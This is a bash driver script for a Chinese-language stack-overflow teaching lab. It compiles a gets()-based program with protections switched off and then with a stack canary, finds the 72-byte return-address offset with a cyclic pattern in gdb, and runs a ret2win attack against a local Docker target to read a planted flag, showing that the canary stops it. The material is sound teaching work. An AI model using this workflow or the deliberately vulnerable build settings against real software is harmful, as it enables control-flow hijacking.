#!/usr/bin/env bash
# =============================================================================
# 25 · Linux 栈溢出原理与 ret2win —— cyclic 定位偏移 / 覆写返回地址 / canary 对照
# 用法: ./stack_lab.sh [apply|observe|clean|all]   (默认 all)
# 前置: Docker（首次构建经 apt 装 gcc/gdb/socat）；宿主侧 python3 + pwntools
# =============================================================================
set -euo pipefail
cd "$(dirname "$0")"

PY="${PYTHON:-python3}"
export PYTHONWARNINGS=ignore          # 屏蔽 pwntools 依赖链的第三方弃用告警
ART="artifacts"
IMAGE="hosec25-lab"
C_LAB="hosec25-lab"
FLAG='HOSEC25{r3t2w1n_0wns_th3_st4ck}'

step() { echo; echo "=====> [$1] $2"; }
ok()   { echo "  ✅ $*"; }
die()  { echo "  ❌ $*" >&2; exit 1; }

do_apply() {
    step "apply" "检查 Docker 与 pwntools → 构建靶场镜像 → 编译漏洞版 / canary 加固版"
    command -v docker > /dev/null || die "缺少 docker"
    docker info > /dev/null 2>&1 || die "Docker 未运行（先启动 OrbStack / Docker Desktop）"
    "$PY" -c 'import pwn' 2>/dev/null || die "宿主缺少 pwntools：pip3 install pwntools"
    docker build -q -t "$IMAGE" configs/ > /dev/null
    ok "靶场镜像已构建（ubuntu 22.04 + gcc/glibc + gdb + socat）"
    mkdir -p "$ART"
    docker run --rm -v "$PWD/configs:/src:ro" -v "$PWD/$ART:/out" "$IMAGE" sh -c '
        gcc -O0 -fno-stack-protector -no-pie -z execstack -o /out/vuln /src/vuln.c 2>/out/build.log
        gcc -O0 -fstack-protector-all -no-pie   -o /out/vuln-canary /src/vuln.c 2>>/out/build.log'
    if grep -q 'dangerous' "$ART/build.log"; then
        echo "  ↳ 链接器警告：the \`gets' function is dangerous and should not be used. —— 漏洞本体"
    fi
    docker run --rm -v "$PWD/$ART:/out:ro" "$IMAGE" sh -c '
        echo "  ↳ readelf 符号表：调用 __stack_chk_fail 的引用数 —— vuln=$(readelf -s /out/vuln | grep -c stack_chk_fail || true)，vuln-canary=$(readelf -s /out/vuln-canary | grep -c stack_chk_fail || true)"'
    "$PY" pwn_lab.py --checksec --vuln "$ART/vuln" --canary "$ART/vuln-canary"
    docker rm -f "$C_LAB" > /dev/null 2>&1 || true
    docker run -d --name "$C_LAB" -p 127.0.0.1:9025:9025 -p 127.0.0.1:9026:9026 \
        -v "$PWD/$ART:/work:ro" "$IMAGE" sh -c \
        "echo '$FLAG' > /flag; \
         socat TCP-LISTEN:9025,reuseaddr,fork EXEC:/work/vuln,stderr & \
         socat TCP-LISTEN:9026,reuseaddr,fork EXEC:/work/vuln-canary,stderr & wait" > /dev/null
    "$PY" - <<'PYEOF' || die "靶场服务未就绪"
import socket, sys, time
for _ in range(20):
    try:
        socket.create_connection(("127.0.0.1", 9025), timeout=1).close()
        sys.exit(0)
    except OSError:
        time.sleep(0.5)
sys.exit(1)
PYEOF
    ok "两个 TCP 服务已就绪：9025 = 漏洞版（-fno-stack-protector），9026 = canary 加固版"
}

do_observe() {
    step "observe" "① cyclic 定位偏移：喂 200 字节 pattern，读崩溃现场的 x30（返回地址）"
    "$PY" pwn_lab.py --gen-cyclic "$ART/cyclic.txt"
    docker exec "$C_LAB" sh -c \
        'gdb -batch -q -nx -ex run -ex "info registers x30" --args /work/vuln < /work/cyclic.txt' \
        > "$ART/gdb.out" 2>&1 || true
    grep -E '^(input:|bye|Program received|x30)' "$ART/gdb.out" | sed 's/^/  ↳ /'
    local x30
    x30=$(awk '/^x30/{print $2}' "$ART/gdb.out")
    [ -n "$x30" ] || die "gdb 没取到 x30——检查容器 9025 服务"
    "$PY" pwn_lab.py --find-offset "$x30" | tee "$ART/offset.out"
    local off
    off=$(sed -n 's/^偏移 = //p' "$ART/offset.out")
    [ "$off" = "72" ] || die "偏移 $off 与理论值 72（buf 64 + 帧指针 8）不符"
    ok "偏移 72 = 64 字节缓冲区 + 8 字节帧指针：第 73 字节起就是返回地址"

    step "observe" "② ret2win：填充 72 字节 + win() 地址 → 让靶子亲手读出 flag"
    "$PY" pwn_lab.py --attack --port 9025 --vuln "$ART/vuln" --offset "$off" --expect flag \
        | tee "$ART/attack.out"
    grep -q 'HOSEC25{' "$ART/attack.out" || die "攻击目标未拿到 flag"
    ok "返回地址被改写为 win()：控制流没走 main 的出口，而是替我们读了 /flag"

    step "observe" "③ canary 对照：同一套 payload 打 -fstack-protector-all 加固版"
    "$PY" pwn_lab.py --attack --port 9026 --vuln "$ART/vuln-canary" --offset "$off" --expect fail \
        | tee "$ART/canary.out"
    if grep -q 'HOSEC25{' "$ART/canary.out"; then
        die "加固版竟被打穿——检查编译选项"
    fi
    grep -q 'stack smashing detected' "$ART/canary.out" || die "没看到 canary 触发提示"
    ok "canary 在函数返回前校验被改写 → *** stack smashing detected ***，控制流到不了 win()"
    echo "  ↳ 为什么挡住：canary 是每次启动随机生成的 8 字节「哨兵」，压在缓冲区与返回地址之间；"
    echo "    溢出必须逐字节穿过它——能精确定位偏移，就等于必然踩中它。"
}

do_clean() {
    step "clean" "删除靶场容器并清理产物（镜像保留，重跑秒级）"
    docker rm -f "$C_LAB" > /dev/null 2>&1 || true
    rm -rf "$ART"
    ok "容器与产物已清；靶场镜像 ${IMAGE} 保留"
}

main() {
    local target="${1:-all}"
    case "$target" in
        apply)   do_apply ;;
        observe) do_observe ;;
        clean)   do_clean ;;
        all)     do_apply; do_observe; do_clean ;;
        *) echo "可用: apply | observe | clean | all" >&2; exit 1 ;;
    esac
}
main "$@"
